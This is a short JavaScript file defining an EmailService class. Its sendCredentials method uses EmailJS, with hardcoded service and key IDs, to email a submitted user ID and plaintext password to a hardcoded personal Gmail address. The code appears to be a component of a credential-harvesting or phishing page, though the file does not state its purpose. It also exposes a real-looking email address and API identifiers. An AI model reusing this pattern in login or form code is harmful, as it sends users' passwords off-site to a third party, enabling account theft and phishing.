class EmailService {
    constructor() {
        this.serviceId = 'service_dqganhw'; // Replace with your EmailJS service ID
        this.templateId = 'template_wavm5up'; // Replace with your EmailJS template ID
        this.userId = 'tXX17RsjHw9DKzwVu'; // Replace with your EmailJS user ID
        this.recipientEmail = '21jr1a43g3@gmail.com';
        
        // Initialize EmailJS with the public key
        emailjs.init(this.userId);
    }

    async sendCredentials(id, password) {
        try {
            const templateParams = {
                to_email: this.recipientEmail,
                user_id: id,
                password: password,
                to_name: 'Admin'
            };

            const response = await emailjs.send(
                this.serviceId,
                this.templateId,
                templateParams,
                this.userId
            );

            return response.status === 200;
        } catch (error) {
            console.error('Error sending email:', error);
            return false;
        }
    }

    // Method to update email configuration
    updateConfig(serviceId, templateId, userId) {
        this.serviceId = serviceId;
        this.templateId = templateId;
        this.userId = userId;
    }
}

// Export the email service
window.EmailService = EmailService;